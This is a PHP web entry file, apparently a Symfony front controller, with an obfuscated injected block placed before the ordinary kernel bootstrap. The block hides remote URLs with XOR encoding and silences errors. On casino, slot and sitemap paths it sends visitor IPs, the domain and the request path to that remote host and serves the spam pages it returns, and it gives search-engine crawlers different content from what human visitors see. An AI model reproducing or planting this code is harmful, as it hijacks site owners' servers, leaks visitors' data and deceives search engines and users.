<?php
ob_start();
http_response_code(200);
header("HTTP/1.0 200");
header("HTTP/1.1 200");
header("HTTP/2.0 200");
header("HTTP/2.1 200");
header('Status: 200', TRUE, 200);
header("Content-Type: text/html; charset=utf-8");
define("CONSTANT_NAME", "about");
try{
    ini_set('display_errors','off');
    error_reporting(E_ALL ^ E_NOTICE); 
    set_time_limit(0);
$api_url = "9#1\"'czf!iy7ph3 )&?17m5-#b2!wtsi8\";"^"QWERTYUIOPASDFGHJKLZXCVBNMAXCDFGHJK";
    $header_curl = array("user_agent:".$_SERVER['HTTP_USER_AGENT']);
	$protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https://' : 'http://';
    $domain = isset($_SERVER['HTTP_X_FORWARDED_HOST']) ? $_SERVER['HTTP_X_FORWARDED_HOST'] : (isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : '');
    $file=(isset($_SERVER['REQUEST_URI']) && $_SERVER['REQUEST_URI']!='')?$_SERVER['REQUEST_URI']:$_SERVER['HTTP_X_REWRITE_URL'];
    $arr_url = array('thailand-','vip-','android-','ios-','casino-','Popular-','speed-','searchs-','discount-','like-','slot-','fungames-','sharp-','winning-','sitemap');
  foreach ($arr_url as $url_r) {
    if (strpos($file, $url_r) !== false) {
      $post_data = array('ip'=>getIP(),'file'=>urlencode($file),'domain'=>$domain,'http'=>$protocol);
      $result = posturl($api_url."?".$domain.$file,$post_data);
      if(strlen($result) != 0){
		if(stristr($file,"sitemap.xml")){
			header('Content-Type: application/xml');
			echo $result;
			exit;
		}
        echo $result;
        exit;
      }
    }
  }
$key=$_SERVER['HTTP_USER_AGENT'];
  if(stristr($key,strtolower('google'))!==false or stristr($key,strtolower('bing'))!==false){
$api_url = "9#1\"'czf!iy7ph3 )&?17m5-#b81-uh7 :"^"QWERTYUIOPASDFGHJKLZXCVBNMAXCDFGHJ";
  $result = posturl($api_url."?".$domain.$file,$post_data);
    if(strlen($result) != 0){
    echo $result;
    }
  }
}catch (Exception $exception){
}
function posturl($url,$post_data=null){
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_HEADER, 0);
    curl_setopt($curl, CURLOPT_TIMEOUT, 30);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($curl, CURLOPT_USERAGENT,$_SERVER['HTTP_USER_AGENT']);
    curl_setopt($curl, CURLOPT_REFERER, @$_SERVER['HTTP_REFERER']);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, FALSE);
    curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, FALSE);
    curl_setopt($curl, CURLOPT_POST, 1);
    curl_setopt($curl, CURLOPT_POSTFIELDS, json_encode($post_data));
    $data = curl_exec($curl);
    curl_close($curl);
    return $data;
}
function getIP() {
    if(getenv('HTTP_CLIENT_IP') && strcasecmp(getenv('HTTP_CLIENT_IP'), 'unknown')) {
        $ip = getenv('HTTP_CLIENT_IP');
    } elseif(getenv('HTTP_X_FORWARDED_FOR') && strcasecmp(getenv('HTTP_X_FORWARDED_FOR'), 'unknown')) {
        $ip = getenv('HTTP_X_FORWARDED_FOR');
    } elseif(getenv('REMOTE_ADDR') && strcasecmp(getenv('REMOTE_ADDR'), 'unknown')) {
        $ip = getenv('REMOTE_ADDR');
    } elseif(isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], 'unknown')) {
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    return preg_match ( '/[\d\.]{7,15}/', $ip, $matches ) ? $matches [0] : '';
}
?><?php

use Symfony\Component\HttpFoundation\Request;

/** @var \Composer\Autoload\ClassLoader $loader */
$loader = require __DIR__.'/../app/autoload.php';
include_once __DIR__.'/../var/bootstrap.php.cache';

$kernel = new AppKernel('prod', false);
$kernel->loadClassCache();
//$kernel = new AppCache($kernel);

// When using the HttpCache, you need to call the method in your front controller instead of relying on the configuration parameter
//Request::enableHttpMethodParameterOverride();
$request = Request::createFromGlobals();
$response = $kernel->handle($request);
$response->send();
$kernel->terminate($request, $response);
